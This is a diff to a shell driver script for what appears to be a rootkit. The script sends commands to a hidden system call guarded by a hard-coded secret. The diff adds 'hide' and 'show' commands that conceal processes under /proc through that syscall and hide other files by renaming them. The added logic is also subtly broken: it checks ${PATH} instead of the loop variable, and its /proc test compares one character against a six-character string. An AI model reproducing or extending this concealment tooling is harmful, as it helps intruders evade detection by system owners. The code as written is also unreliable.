@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 # simple driver script
-# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | @CARRAY ...]
+# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | CARRAY ...]
 # CALL
 #   system call number
 # COMMAND
@@ -34,5 +34,27 @@ COMMAND_LEN=`echo -n "${COMMAND}" | wc -c`
 SECRET=0xDEADBEEFDEADBEEF
 REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
 
-./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
+if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
+then
+  for _PATH in $@
+  do
+    if [ "$(echo \"${PATH}\" | cut -c 6)" = "/proc/" ]
+    then
+      # it's likely a process; delegate
+
+      ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" "@${_PATH}"
+    elif [ "${COMMAND}" = hide ]
+    then
+      # hide via rename
+
+      mv "${_PATH}" "${PREFIX}${_PATH}"
+    else
+      # show via rename
+
+      mv "${PREFIX}${_PATH}" "${_PATH}"
+    fi
+  done
+else
+  ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
+fi
 
